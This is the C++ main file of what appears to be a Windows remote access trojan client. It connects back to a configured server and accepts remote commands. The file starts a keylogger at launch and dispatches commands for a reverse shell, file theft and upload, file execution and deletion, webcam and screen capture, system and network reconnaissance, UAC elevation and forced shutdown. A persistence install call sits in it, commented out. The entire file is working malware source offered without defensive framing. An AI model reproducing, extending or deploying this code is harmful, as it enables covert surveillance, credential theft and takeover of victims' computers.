#include <iostream>
#include <winsock2.h>
#include <chrono>
#include <thread>
#include <mutex>
#include <cstring>
#include "Stream.h"
#include "Download.h"
#include "FileManager.h"
#include "SystemInformation.h"
#include "NetworkInformation.h"
#include "ReverseShell.h"
#include "KeyboardExecuter.h"
#include "Permission.h"
#include "MessageBoxGUI.h"
#include "SystemState.h"
#include "Install.h"
#include "configuration.h"
#include "ThreadGen.h"
#include "WebcamManager.h"
#include "ScreenStreamer.h"
#include "json.hpp"


std::map<std::string, std::shared_ptr<Stream>> connections;
std::mutex connections_mutex;

std::vector<std::string> socket_conf_list = {"MAIN",
                                             "FILE_MANAGER",
                                             "DOWNLOAD_UPLOAD",
                                             "REVERSE_SHELL",
                                             "KEYLOGGER",
                                             "PERMISSION",
                                             "WEBCAM",
                                             "SCREEN",
                                             "SCREEN_EVENT"};

void add_connection(const std::string &key, Stream &stream) {
    std::lock_guard<std::mutex> lock(connections_mutex);
    std::shared_ptr<Stream> shared_stream = std::make_shared<Stream>(stream);
    connections[key] = shared_stream;
}

std::shared_ptr<Stream> get_connection(const std::string &key) {
    std::lock_guard<std::mutex> lock(connections_mutex);
    return connections[key];
}


bool generate_sockets() {
    WSADATA WSAData;
    if (WSAStartup(MAKEWORD(2, 0), &WSAData) != 0) {
        std::cerr << "Failed to initialize WinSock" << std::endl;
        return false;
    }

    SOCKADDR_IN sin;
    sin.sin_addr.s_addr = inet_addr(IP);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    for (const auto &i: socket_conf_list) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Failed to create socket" << std::endl;
            return false;
        }

        if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) == SOCKET_ERROR) {
            std::cerr << "Failed to connect socket" << std::endl;
            closesocket(sock);
            return false;
        }

        Stream stream(sock);
        stream.readString();
        stream.sendString(i.c_str());
        if (stream.readString() != "OK") {
            closesocket(sock);
            return false;
        }

        add_connection(i, stream);
        std::cout << "new connection created" << std::endl;
    }


    return true;
}


int main(int argc = 0, char *argv[] = nullptr) {
    Sleep(argc);
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
//#ifdef KEYLOGGER_DEF
        KeyLogger keyLogger(Stream(0));
        keyLogger.tryStart();
//#endif
        //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
        bool connectionState = true;
        while (connectionState) {
            nlohmann::json jsonObject;
            std::cout << "trying to connect " << std::endl;
            generate_sockets();
            ThreadGen threadGen;
            Stream stream = *get_connection("FILE_MANAGER");
            FileManager fileManager(stream);
            stream = *get_connection("DOWNLOAD_UPLOAD");
            Download download(stream);
            stream = *get_connection("REVERSE_SHELL");
            ReverseShell reverseShell(stream);
            stream = *get_connection("KEYLOGGER");
            keyLogger.setStream(stream);
            stream = *get_connection("PERMISSION");
            Permission permission(stream);
            stream = *get_connection("WEBCAM");
            DeviceEnumerator deviceEnumerator(stream);
            WebcamManager webcamManager(stream);
            stream = *get_connection("SCREEN");
            Stream altStream = *get_connection("SCREEN_EVENT");
            ScreenStreamer screenStreamer(stream, altStream);
            stream = *get_connection("MAIN");
            MessageBoxGUI messageBoxGUI(stream);
            KeyboardExecuter keyboardExecuter(stream);
            SystemInformation sysInfo(stream);
            NetworkInformation networkInfo(stream);


            bool streamListening = true;
            /*
            if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
                std::cout << "Connected to server!" << std::endl;
                Stream stream(sock);
                SystemInformation sysInfo(stream);
                NetworkInformation networkInfo(stream);
                FileManager fileManager(stream);
                ReverseShell reverseShell(stream);
                Download download(stream);
                KeyboardExecuter keyboardExecuter(stream);
                Permission permission(stream);
                MessageBoxGUI messageBoxGui(stream);
#ifdef KEYLOGGER_DEF
                keyLogger.setStream(stream);
#endif
             */


            while (streamListening) {
                jsonObject = nlohmann::json::parse(stream.readString());
                int action = jsonObject["action"];
                std::cout << "action -> " << action << std::endl;
                switch (action) {
                    case -3: { // Uninstall client
                        Install::uninstall();
                    }
                    case -2: { // Fully disconnect and close program
                        connectionState = false;
                        streamListening = false;
                        break;
                    }
                    case -1: { // Try to connect again to server
                        streamListening = false;
                        break;
                    }
                    case 0: { // System information retrieving
                        sysInfo.send();
                        break;
                    }
                    case 1: {  // Network information retrieving
                        networkInfo.send();
                        break;
                    }
                    case 2: {  // Reading disks of system
                        threadGen.runInNewThread(&fileManager, &FileManager::sendDisks);
                        break;
                    }
                    case 3: { // Read all directory (files and folders)
                        threadGen.runInNewThread(&fileManager, &FileManager::sendDirectory, jsonObject);
                        break;
                    }
                    case 5: { // download file or directory
                        threadGen.runInNewThread(&download, &Download::downloadContent, jsonObject);
                        break;
                    }
                    case 6: { // copy file or directory
                        threadGen.runInNewThread(&fileManager, &FileManager::copyFilesThread, jsonObject);
                        break;
                    }
                    case 7: { // move file or directory
                        threadGen.runInNewThread(&fileManager, &FileManager::moveFilesThread, jsonObject);
                        break;
                    }
                    case 8: { // delete file or directory
                        threadGen.runInNewThread(&fileManager, &FileManager::deleteFilesThread, jsonObject);
                        break;
                    }
                    case 9: { // run file or directory
                        threadGen.runInNewThread(&fileManager, &FileManager::runFilesThread, jsonObject);
                        break;
                    }
                    case 10: { // upload files to directory
                        threadGen.runInNewThread(&download, &Download::uploadFiles, jsonObject);
                        break;
                    }
                    case 11: { // executes command on shell
                        threadGen.runInNewThread(&reverseShell, &ReverseShell::executeCommandAndSendResult, jsonObject);
                        break;
                    }
//#ifdef KEYLOGGER_DEF
                    case 4: { // sends last log file in current session of client
                        threadGen.runInNewThread(&keyLogger, &KeyLogger::send);
                        break;
                    }
                    case 14: { // sends all logs located on appdata folder
                        threadGen.runInNewThread(&keyLogger, &KeyLogger::sendAll);
                        break;
                    }
//#endif
#ifdef WEBCAM
                    case 16: { // send webcam devices
                        threadGen.runInNewThread(&deviceEnumerator, &DeviceEnumerator::sendWebcamDevices);
                        break;
                    }

                    case 17: { // downloadContent webcam with custom features
                        threadGen.runInNewThread(&webcamManager, &WebcamManager::startWebcam, jsonObject);
                        break;
                    }
#endif
                    case 18: { // keyboard executer, executeCommand custom order of keyboard strokes and delays
                        threadGen.runInNewThread(&keyboardExecuter, &KeyboardExecuter::executeCommand, jsonObject);
                        break;
                    }
                    case 20: { // send result of UAC dialog
                        threadGen.runInNewThread(&permission, &Permission::sendElevatedPermissions);
                        break;
                    }
                    case 21: { // open messagebox with custom features
                        threadGen.runInNewThread(&messageBoxGUI, &MessageBoxGUI::generateMessageBox, jsonObject);
                        break;
                    }
#ifdef WEBCAM
                    case 22: { // downloadContent screen streaming TODO fix screen controlling and new thread and socket
                        threadGen.runInNewThread(&screenStreamer, &ScreenStreamer::startStreaming, jsonObject);
                        break;
                    }
#endif
                    case 23: { // log off
                        SystemState::setState(0);
                        break;
                    }
                    case 24: { // shutdown
                        SystemState::setState(1);
                        break;
                    }
                    case 26: { // restart
                        SystemState::setState(2);
                        break;
                    }
                    default:
                        break;
                }
            }
            // TODO FIX CLOSING
            //closesocket(sock);
            WSACleanup();
            std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
        }
    }
    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;
}
